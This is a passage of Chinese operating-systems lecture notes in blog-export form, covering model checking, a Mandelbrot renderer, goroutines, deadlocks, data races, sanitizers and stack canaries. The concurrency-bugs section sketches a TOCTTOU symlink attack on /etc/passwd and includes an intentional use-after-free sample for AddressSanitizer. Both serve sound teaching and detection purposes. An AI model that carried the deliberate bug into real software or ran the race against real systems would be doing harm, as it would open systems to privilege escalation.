class="keyword">if</span> self.waits:</span><br><span class="line">            self.waits = self.waits[<span class="number">1</span>:]		  <span class="comment"># 将队首元素踢出队列 &lt;=&gt; 将编号为队首元素的线程唤醒</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.locked = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @thread</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">t1</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">if</span> self.tryacquire() == <span class="string">&#x27;🔒&#x27;</span>:     <span class="comment"># User</span></span><br><span class="line">                self.waits = self.waits + <span class="string">&#x27;1&#x27;</span> <span class="comment"># Kernel</span></span><br><span class="line">                <span class="keyword">while</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">in</span> self.waits:      <span class="comment"># Kernel</span></span><br><span class="line">                    <span class="keyword">pass</span></span><br><span class="line">            cs = <span class="literal">True</span>                         <span class="comment"># User</span></span><br><span class="line">            <span class="keyword">del</span> cs                            <span class="comment"># User</span></span><br><span class="line">            self.release()                    <span class="comment"># Kernel</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @thread</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">t2</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">if</span> self.tryacquire() == <span class="string">&#x27;🔒&#x27;</span>:</span><br><span class="line">                self.waits = self.waits + <span class="string">&#x27;2&#x27;</span></span><br><span class="line">                <span class="keyword">while</span> <span class="string">&#x27;2&#x27;</span> <span class="keyword">in</span> self.waits:</span><br><span class="line">                    <span class="keyword">pass</span></span><br><span class="line">            cs = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">del</span> cs</span><br><span class="line">            self.release()</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>Tip: 强大的 model checker</strong></p>
<ul>
<li><p>我们的 model checker 的原理是：对于有装饰器 thread 修饰的函数，在每条语句后添加 yield。因此我们可以轻松地实现一个原子的操作：只要将操作写成一个函数，并在一行内调用这个函数即可。再例如，xchg 原子操作在我们的 model checker 中可以很简单地写为</p>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x, y = y, x</span><br></pre></td></tr></table></figure></li>
<li><p>线程函数中的语句</p>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">in</span> self.waits:</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<p>  并不是内核的真正行为：内核会切换走去执行别的线程。但从这个正在等待的线程的视角，内核在做和自己无关的事等价于内核在自己这里轮询。因此我们精巧地模拟出了内核的正确行为。</p>
</li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>NJU-22020230 Operating Systems</category>
        <category>Lecture Notes</category>
      </categories>
  </entry>
  <entry>
    <title>NJU-OS Lecture 07: Concurrent Programming - Real World</title>
    <url>/2022/03/08/NJU-OS%20Lecture%2007%20-%20Concurrent%20Programming%20-%20Real%20World/</url>
    <content><![CDATA[<h2 id="High-Performance-Computing"><a href="#High-Performance-Computing" class="headerlink" title="High Performance Computing"></a>High Performance Computing</h2><p>HPC: 解决需要 massive computation 的任务。</p>
<p>基本思路：计算图会分成若干层，每层会有很多要计算的节点。将每层的任务先分配到机器，机器里再分配到线程 (两级分解)，并行计算这些节点后，用一个 “join()” 汇总一下 (涉及线程、机器、共享内存之间的通信)。</p>
<p>HPC 可以实现的原因：数据的局部性。例如我们想利用 HPC 进行一团气体的运动模拟，那么我们可以将立方体容器内的气体切分成很多块，每个线程管一块。每个线程管理的气体绝大部分的运动都是本地的，我们只需要处理少部分的相邻块的气体分子交换即可。</p>
<span id="more"></span>

<h3 id="Example-Mandelbrot-Set"><a href="#Example-Mandelbrot-Set" class="headerlink" title="Example: Mandelbrot Set"></a>Example: Mandelbrot Set</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// mandelbrot.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;thread.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> NT;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> W 6400</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> H 6400</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMG_FILE <span class="meta-string">&quot;./mandelbrot.ppm&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">belongs</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y, <span class="keyword">int</span> t)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> x / (W / NT) == t;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> x[W][H];</span><br><span class="line"><span class="keyword">int</span> <span class="keyword">volatile</span> done = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">display</span><span class="params">(FILE *fp, <span class="keyword">int</span> step)</span> </span>&#123; </span><br><span class="line">  <span class="keyword">static</span> <span class="keyword">int</span> rnd = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">int</span> w = W / step, h = H / step;</span><br><span class="line">  <span class="comment">// STFW: Portable Pixel Map</span></span><br><span class="line">  <span class="built_in">fprintf</span>(fp, <span class="string">&quot;P6\n %d %d 255\n&quot;</span>, w, h);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; H; j += step) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; W; i += step) &#123;</span><br><span class="line">      <span class="keyword">int</span> n = x[i][j];</span><br><span class="line">      <span class="keyword">int</span> r = <span class="number">255</span> * <span class="built_in">pow</span>((n - <span class="number">80</span>) / <span class="number">800.0</span>, <span class="number">3</span>);</span><br><span class="line">      <span class="keyword">int</span> g = <span class="number">255</span> * <span class="built_in">pow</span>((n - <span class="number">80</span>) / <span class="number">800.0</span>, <span class="number">0.7</span>);</span><br><span class="line">      <span class="keyword">int</span> b = <span class="number">255</span> * <span class="built_in">pow</span>((n - <span class="number">80</span>) / <span class="number">800.0</span>, <span class="number">0.5</span>);</span><br><span class="line">      fputc(r, fp); fputc(g, fp); fputc(b, fp);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Tworker</span><span class="params">(<span class="keyword">int</span> tid)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; W; i++)</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; H; j++)</span><br><span class="line">      <span class="keyword">if</span> (belongs(i, j, tid - <span class="number">1</span>)) &#123;</span><br><span class="line">        <span class="keyword">double</span> a = <span class="number">0</span>, b = <span class="number">0</span>, c, d;</span><br><span class="line">        <span class="keyword">while</span> ((c = a * a) + (d = b * b) &lt; <span class="number">4</span> &amp;&amp; x[i][j]++ &lt; <span class="number">880</span>) &#123;</span><br><span class="line">          b = <span class="number">2</span> * a * b + j * <span class="number">1024.0</span> / H * <span class="number">8e-9</span> - <span class="number">0.645411</span>;</span><br><span class="line">          a = c - d + i * <span class="number">1024.0</span> / W * <span class="number">8e-9</span> + <span class="number">0.356888</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  done++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Tdisplay</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">float</span> ms = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    FILE *fp = popen(<span class="string">&quot;viu -&quot;</span>, <span class="string">&quot;w&quot;</span>); assert(fp);</span><br><span class="line">    display(fp, W / <span class="number">256</span>);</span><br><span class="line">    pclose(fp);</span><br><span class="line">    <span class="keyword">if</span> (done == NT) <span class="keyword">break</span>;</span><br><span class="line">    usleep(<span class="number">1000000</span> / <span class="number">5</span>);</span><br><span class="line">    ms += <span class="number">1000.0</span> / <span class="number">5</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Approximate render time: %.1lfs\n&quot;</span>, ms / <span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">  FILE *fp = fopen(IMG_FILE, <span class="string">&quot;w&quot;</span>); assert(fp);</span><br><span class="line">  display(fp, <span class="number">2</span>);</span><br><span class="line">  fclose(fp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">  assert(argc == <span class="number">2</span>);</span><br><span class="line">  NT = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; NT; i++) &#123;</span><br><span class="line">    create(Tworker);</span><br><span class="line">  &#125;</span><br><span class="line">  create(Tdisplay);</span><br><span class="line">  join();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这段代码使用一些数学手法画出一幅清晰度很高，非常美观的分形图。代码中有一些有意思的小工具：</p>
<ul>
<li><p>Tdisplay 线程中使用了 viu 命令行工具，它可以将一张图片以较低的分辨率打印在终端上，这可以在让我们看到图像生成的大致过程。我们可以看到该程序将画面切分成了多个部分，每个线程控制一个。</p>
</li>
<li><p>Tdisplay 线程最终将像素信息输出到了一个 ppm (portable pixel map) 文件中。对于 C 语言来说，这是一种非常方便的输出图像的方式：只需要在文件开头输出</p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line">P6</span><br><span class="line">W H COLOR <span class="comment">// 宽，高，颜色数</span></span><br></pre></td></tr></table></figure>

<p>  然后一行一行地将每个点的 RGB 值输出即可。</p>
</li>
</ul>
<h2 id="Data-Center"><a href="#Data-Center" class="headerlink" title="Data Center"></a>Data Center</h2><p>多副本情况下的低延迟、高可靠性问题。这其中存在一些互相矛盾的点</p>
<ul>
<li>Availability - 数据在 data center 应该有多个副本，这样如果某个副本坏了，数据不会丢失。此外，为了各地地人可以快速读取，服务器会把本地城市 data center 的数据直接返回。</li>
<li>Consistency - ”我在南京屏蔽我妈，我妈在广州也要响应这个屏蔽。” 不能因为图快而不同步地直接读取本地副本。</li>
<li>Partition Tolerance</li>
</ul>
<p>这门课的问题：如何在一台计算机上既可能高效地处理并行请求？</p>
<p>我们的工具：线程、协程</p>
<ul>
<li>线程：可以在操作系统的调度算法下进行切换，但线程切换很“重”：需要保存上下文，需要陷入内核 (privilege level 的改变)……</li>
<li>协程：更轻量级的并发 (只要遵守 calling convention，切换时不需要保存那么多寄存器，不需要进操作系统)，但只有执行 co_yield() 才会切换，如果某个线程执行了很慢的 I/O 系统调用，剩下的协程就都在摸鱼。</li>
</ul>
<h3 id="Goroutine"><a href="#Goroutine" class="headerlink" title="Goroutine"></a>Goroutine</h3><p>Go 是一门专门服务系统编程的语言。go 支持所谓的 goroutine: 在概念上它是线程，但它是使用类似于协程的原理实现的。每个 CPU 上只有一个线程，但这个线程下有多个 goroutine，每个 CPU 上有一个 Go worker 负责调度这些 goroutine。goroutine 切换的方式和协程相似，因此非常轻量级。对于某些会导致阻塞的系统调用 (如 sleep, rand)，go 会将他们改成 non-blocking 的版本，如果需要陷入内核进行长时间操作，它就会 yield 到另一个 goroutine 执行。这样，goroutine 将操作系统和 CPU 都利用到了100%。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Example from &quot;The Go Programming Language&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">  <span class="string">&quot;fmt&quot;</span></span><br><span class="line">  <span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">  <span class="keyword">go</span> spinner(<span class="number">100</span> * time.Millisecond)</span><br><span class="line">  <span class="keyword">const</span> n = <span class="number">45</span></span><br><span class="line">  fibN := fib(n) <span class="comment">// slow</span></span><br><span class="line">  fmt.Printf(<span class="string">&quot;\rFibonacci(%d) = %d\n&quot;</span>, n, fibN)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">spinner</span><span class="params">(delay time.Duration)</span></span> &#123;</span><br><span class="line">  <span class="keyword">for</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> _, r := <span class="keyword">range</span> <span class="string">`-\|/`</span> &#123;</span><br><span class="line">      fmt.Printf(<span class="string">&quot;\r%c&quot;</span>, r)</span><br><span class="line">      time.Sleep(delay)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">fib</span><span class="params">(x <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">  <span class="keyword">if</span> x &lt; <span class="number">2</span> &#123; <span class="keyword">return</span> x &#125;</span><br><span class="line">  <span class="keyword">return</span> fib(x - <span class="number">1</span>) + fib(x - <span class="number">2</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在主函数中，我们使用 <code>go spinner</code> 创建了一个新的 goroutine。该程序可以一边计算 Fibinacci 数列，一边在 spinner 协程中打印旋转的进度条。</p>
<p>绝大部分的并发问题都可以通过生产者-消费者模型来解决。Go 语言封装了生产者-消费者队列，提供了用于 goroutines 之间通信的 API：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> stream = <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">int</span>, <span class="number">10</span>)</span><br><span class="line"><span class="keyword">const</span> n = <span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">produce</span><span class="params">()</span></span> &#123;</span><br><span class="line">  <span class="keyword">for</span> i := <span class="number">0</span>; ; i++ &#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;produce&quot;</span>, i)</span><br><span class="line">    stream &lt;- i</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">consume</span><span class="params">()</span></span> &#123;</span><br><span class="line">  <span class="keyword">for</span> &#123;</span><br><span class="line">    x := &lt;-stream</span><br><span class="line">    fmt.Println(<span class="string">&quot;consume&quot;</span>, x)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">  <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; n; i++ &#123;</span><br><span class="line">    <span class="keyword">go</span> produce()</span><br><span class="line">  &#125;</span><br><span class="line">  consume()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>make(chan int, 10)</code> 定义了一个通道，并规定了其最大容量 (最大容量为 0 的 channel 可以用来同步)。生产者通过 <code>stream &lt;- i</code> 往队列里面加东西，消费者通过 <code>x := &lt;-stream</code> 从队列里面取东西。其内部的锁，睡眠等细节问题全部对程序员透明。</p>
<h2 id="Web-2-0"><a href="#Web-2-0" class="headerlink" title="Web 2.0"></a>Web 2.0</h2><p>在网页这种计算量、并发量都不大的场景下，我们使用的模型是单线程+事件模型。事件按照顺序执行，具有原子性 (减少了发生并发 bug 的可能)，遇到耗时的 API 就立刻返回 (结束一个事件)。</p>
<p>为了代码的可维护性，描述流图的语言正在发展。</p>
]]></content>
      <categories>
        <category>NJU-22020230 Operating Systems</category>
        <category>Lecture Notes</category>
      </categories>
  </entry>
  <entry>
    <title>NJU-OS Lecture 08: Concurrent Bugs &amp; Confrontation</title>
    <url>/2022/03/11/NJU-OS%20Lecture%2008%20-%20Concurrent%20Bugs%20and%20Confrontation/</url>
    <content><![CDATA[<p>Bug 多的根本原因：软件是需求在计算机世界的投影，人类世界的很多性质在编程语言中丧失了。</p>
<h2 id="Defensive-Programming"><a href="#Defensive-Programming" class="headerlink" title="Defensive Programming"></a>Defensive Programming</h2><p>一个好的策略是添加很多的 assert()，assert() 的核心意义在于将程序的需求表达出来。</p>
<p>assert() 虽然不一定能写得对，但如果 assert() 和代码出错的概率是独立的，那么写 assert() 就使得程序出错的概率降低了一个数量级。</p>
<span id="more"></span>

<h2 id="Concurrent-Bugs"><a href="#Concurrent-Bugs" class="headerlink" title="Concurrent Bugs"></a>Concurrent Bugs</h2><h3 id="Deadlock"><a href="#Deadlock" class="headerlink" title="Deadlock"></a>Deadlock</h3><blockquote>
<p><strong>一个中断相关的死锁</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">os_run</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> spin_lock(&amp;lk);</span><br><span class="line"> spin_lock(&amp;xxx);</span><br><span class="line"> spin_unlock(&amp;xxx); <span class="comment">//------+</span></span><br><span class="line">&#125;					   <span class="comment">//  	   |</span></span><br><span class="line">					   <span class="comment">//	   | Interrupt</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">on_interrupt</span><span class="params">()</span>	   <span class="comment">//	   |</span></span></span><br><span class="line"><span class="function"></span>&#123;					   <span class="comment">//	   |</span></span><br><span class="line"> spin_lock(&amp;lk); <span class="comment">// &lt;-------+</span></span><br><span class="line"> ...</span><br><span class="line"> spin_unlock(&amp;lk);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上锁的时候要关中断，且锁出现嵌套的时候，需要一个计数器来维护嵌套层数，只有完全无锁的时候才能开中断 (释放锁的时候不能莽开中断)。</p>
</blockquote>
<ul>
<li><p>AA-deadlock：某个线程在试图获得自己已经获得的锁。这很容易检测出来。在编程的时候理应多使用如下的防御性编程：</p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (holding(lk)) panic();</span><br></pre></td></tr></table></figure></li>
<li><p>ABBA-deadlock：进程在互相等待别人的锁。lock-ordering 是一种好的防御方法：系统中所有的锁必须排出一个无环的拓扑序。</p>
<blockquote>
<p>model checker 可以可视化地帮我们检查是否有死锁。如果某个节点所有的出边都指向自己，这就是一个陷入死锁的状态。</p>
</blockquote>
</li>
</ul>
<h3 id="Data-Race"><a href="#Data-Race" class="headerlink" title="Data Race"></a>Data Race</h3><p>两个线程在同一时间访问同一个地址，且至少有一个是写。之所以被称为“竞争”是因为运行的结果取决于“谁跑赢了”。</p>
<h3 id="Atomicity-Violation-AV-amp-Order-Violation-OV"><a href="#Atomicity-Violation-AV-amp-Order-Violation-OV" class="headerlink" title="Atomicity Violation (AV) &amp; Order Violation (OV)"></a>Atomicity Violation (AV) &amp; Order Violation (OV)</h3><p>TOCTTOU (time of check to time of use)：某段代码通常会检查某个条件 (time to check)，然后在认为这个条件的成立是 invariant 的情况下对其进行某种操作 (time of use)，但如果其他程序在中间插入做了某个改变 invariant 的操作，就会产生 bug。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">					   TIME		</span><br><span class="line">/home/abc/mailbox		|</span><br><span class="line">a symbolic link?		|</span><br><span class="line">		|				|		Delete /home/abc/mailbox</span><br><span class="line">		| 				|</span><br><span class="line">		| No			|		Create symbolic link</span><br><span class="line">		|				|		~/mailbox, pointing to </span><br><span class="line">		|				|		/etc/passwd</span><br><span class="line">Append the new message	|</span><br><span class="line">to /home/abc/mailbox	|</span><br></pre></td></tr></table></figure>

<p>在上述过程中，如果攻击者利用 TOC 和 TOU 之间的窗口期将 <code>/home/abc/mailbox</code> 指向某个非法的文件 (打破了 kernel 之前检查的条件)，kernel 就可能会给普通用户 root 权限。</p>
<h2 id="Bugs-Confrontation"><a href="#Bugs-Confrontation" class="headerlink" title="Bugs Confrontation"></a>Bugs Confrontation</h2><h3 id="Lockdep"><a href="#Lockdep" class="headerlink" title="Lockdep"></a>Lockdep</h3><p>我们可以为每把锁一个全局唯一的 allocation site。在所有获得锁/释放锁的时间点记录一份日志，然后对日志进行分析 (观察上锁顺序)，如果对于某两把锁 $x,y$，我们能观测到 $x\rightsquigarrow y\and y\rightsquigarrow x$，则检测出了可能的死锁。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// lock-site.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">lock</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> locked;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *site;</span><br><span class="line">&#125; <span class="keyword">lock_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STRINGIFY(s) #s</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TOSTRING(s)  STRINGIFY(s)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LOCK_INIT() \</span></span><br><span class="line"><span class="meta">  ( (lock_t) &#123; .locked = 0, .site = __FILE__ <span class="meta-string">&quot;:&quot;</span> TOSTRING(__LINE__), &#125; )</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">lock_t</span> lk1 = LOCK_INIT();</span><br><span class="line"><span class="keyword">lock_t</span> lk2 = LOCK_INIT();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">lock</span><span class="params">(<span class="keyword">lock_t</span> *lk)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;LOCK   %s\n&quot;</span>, lk-&gt;site);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">unlock</span><span class="params">(<span class="keyword">lock_t</span> *lk)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;UNLOCK %s\n&quot;</span>, lk-&gt;site);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">some_object</span> &#123;</span></span><br><span class="line">  <span class="keyword">lock_t</span> lock;</span><br><span class="line">  <span class="keyword">int</span> data;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">object_init</span><span class="params">(struct some_object *obj)</span> </span>&#123;</span><br><span class="line">  obj-&gt;lock = LOCK_INIT();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  lock(&amp;lk1);</span><br><span class="line">  lock(&amp;lk2);</span><br><span class="line">  unlock(&amp;lk1);</span><br><span class="line">  unlock(&amp;lk2);</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">some_object</span> *<span class="title">obj</span> =</span> <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct some_object));</span><br><span class="line">  assert(obj);</span><br><span class="line">  object_init(obj);</span><br><span class="line">  lock(&amp;obj-&gt;lock);</span><br><span class="line"></span><br><span class="line">  lock(&amp;lk2);</span><br><span class="line">  lock(&amp;lk1);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面的 <code>lock-site.c</code> 提供了一种简单的为每个锁提供唯一 allocation site 的方法，其中的一些宏定义值得学习。</p>
<h3 id="Sanitizer"><a href="#Sanitizer" class="headerlink" title="Sanitizer"></a>Sanitizer</h3><p>运行时的动态检查。AddressSanitizer 可以检查内存访问的 bug (监控所有的内存访问)，ThreadSanitizer 可以检查数据竞争 (内存访问 + lock/unlock)，此外还有 UBSanitizer, MemorySanitizer 等。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// uaf.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> *ptr = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">  *ptr = <span class="number">1</span>;</span><br><span class="line">  <span class="built_in">free</span>(ptr);</span><br><span class="line">  *ptr = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上述程序存在 use-after-free 问题。在编译时加入 <code>-fsanitize=address</code>，运行程序时，我们可以得到丰富的报错信息。</p>
<h3 id="Lightweight-Tools"><a href="#Lightweight-Tools" class="headerlink" title="Lightweight Tools"></a>Lightweight Tools</h3><h4 id="Stack-Canary"><a href="#Stack-Canary" class="headerlink" title="Stack Canary"></a>Stack Canary</h4><p>在栈顶和栈底设置一些存储了特殊值的内存单元 (金丝雀) 并定期检查这些单元。如果这些单元被修改了，说明发生了栈溢出。我们只需很短的代码就可以完成 stack canary：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAGIC 0x55555555</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BOTTOM (STK_SZ / sizeof(u32) - 1)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">stack</span> &#123;</span> <span class="keyword">char</span> data[STK_SZ]; &#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">canary_init</span><span class="params">(struct <span class="built_in">stack</span> *s)</span> </span>&#123;</span><br><span class="line">  u32 *ptr = (u32 *)s;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; CANARY_SZ; i++)</span><br><span class="line">    ptr[BOTTOM - i] = ptr[i] = MAGIC;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">canary_check</span><span class="params">(struct <span class="built_in">stack</span> *s)</span> </span>&#123;</span><br><span class="line">  u32 *ptr = (u32 *)s;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; CANARY_SZ; i++) &#123;</span><br><span class="line">    panic_on(ptr[BOTTOM - i] != MAGIC, <span class="string">&quot;underflow&quot;</span>);</span><br><span class="line">    panic_on(ptr[i] != MAGIC, <span class="string">&quot;overflow&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们有时在 windows 中会看到的 “烫烫烫” 等字，其实是 stack canary 在 GB2312 编码下的结果：</p>
<ul>
<li>未初始化栈: <code>0xcccccccc</code></li>
<li>未初始化堆: <code>0xcdcdcdcd</code></li>
<li>对象头尾: <code>0xfdfdfdfd</code></li>
<li>已回收内存: <code>0xdddddddd</code></li>
</ul>
<p>我们可以用</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">(<span class="string">b&#x27;\xcc&#x27;</span> * <span class="number">80</span>).decode(<span class="string">&#x27;gb2312&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>查看使用未初始化栈时得到的内容 (烫烫烫)。</p>
<h4 id="Lightweight-Lockdep"><a href="#Lightweight-Lockdep" class="headerlink" title="Lightweight Lockdep"></a>Lightweight Lockdep</h4><p>很多情况下，我们可以在自旋锁自旋次数过多的时候直接报警，然后利用 GDB 的 backtrace 功能观察是否真的发生了死锁。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> spin_cnt = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (xchg(&amp;locked, <span class="number">1</span>)) &#123;</span><br><span class="line">  <span class="keyword">if</span> (spin_cnt++ &gt; SPIN_LIMIT) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Too many spin @ %s:%d\n&quot;</span>, __FILE__, __LINE__);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>NJU-22020230 Operating Systems</category>
        <category>Lecture Notes</category>
      </categories>
  </entry>
  <entry>
